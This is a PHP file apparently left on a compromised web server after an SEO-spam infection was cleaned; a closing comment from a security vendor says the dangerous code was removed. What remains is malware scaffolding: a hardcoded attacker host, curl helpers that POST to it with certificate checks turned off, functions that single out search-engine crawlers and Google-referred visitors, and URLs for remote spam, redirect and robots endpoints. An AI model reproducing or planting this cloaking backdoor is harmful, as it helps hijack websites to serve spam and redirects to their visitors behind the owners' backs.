<?php 
error_reporting(E_ERROR);
set_time_limit(0);
$a='http://boc.fk2.us/fxseo';
$bb='';
function curl_get_contents($url) {
	$ch=curl_init();
	curl_setopt ($ch, CURLOPT_URL, $url);
	curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 5);
	$file_contents = curl_exec($ch);
	curl_close($ch);
	return $file_contents;
}
function getServerCont($url,$data=array()) {
	$url=str_replace(' ','+',$url);
	$ch=curl_init();
	curl_setopt($ch,CURLOPT_URL,"$url");
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
	curl_setopt($ch,CURLOPT_HEADER,0);
	curl_setopt($ch,CURLOPT_TIMEOUT,10);
	curl_setopt($ch,CURLOPT_POST,1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
	curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($data));
	$output = curl_exec($ch);
	$errorCode = curl_errno($ch);
	curl_close($ch);
	if(0!== $errorCode) {
		return false;
	}
	return $output;
}
function getServerCont11($url,$data=array()) {
	$url=str_replace(' ','+',$url);
	$ch=curl_init();
	curl_setopt($ch,CURLOPT_URL,"$url");
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
	curl_setopt($ch,CURLOPT_HEADER,0);
	curl_setopt($ch,CURLOPT_TIMEOUT,10);
	curl_setopt($ch,CURLOPT_POST,1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
	curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($data));
	$output = curl_exec($ch);
	$errorCode = curl_errno($ch);
	curl_close($ch);
	if(0!== $errorCode) {
		return false;
	}
	return $output;
}
function is_crawler($agent) {
    
	$agent_check=false;
	$bots='googlebot|google|yahoo|bing|aol';
	if($agent!='') {
		if(preg_match("/($bots)/si",$agent)) {
			$agent_check = true;
		}
	}
	return $agent_check;
}
function check_refer($refer) {
	$check_refer=false;
	$referbots='google.co.in|google.co.vn|google.co.th|google.com.hk|google.com.tw|google.co.jp|yahoo.co.jp|google.co';
	if($refer!='' && preg_match("/($referbots)/si",$refer)) {
		$check_refer=true;
	}
	return $check_refer;
}
$http=((isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https://':'http://');
$req_uri=$_SERVER['REQUEST_URI'];
$domain=$_SERVER["HTTP_HOST"];
$self=$_SERVER['PHP_SELF'];
$ser_name=$_SERVER['SERVER_NAME'];
$req_url=$http.$domain.$req_uri;
$indata1=$a."/indatas.php";
$map1=$a."/map.php";
$jump1=$a."/jump.php";
$url_words=$a."/words.php";
$url_robots=$a."/robots.php";

/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code have been removed, and the file is now safe to use.
* Feel free to contact Imunify support team at https://www.imunify360.com/support/new
*/

?>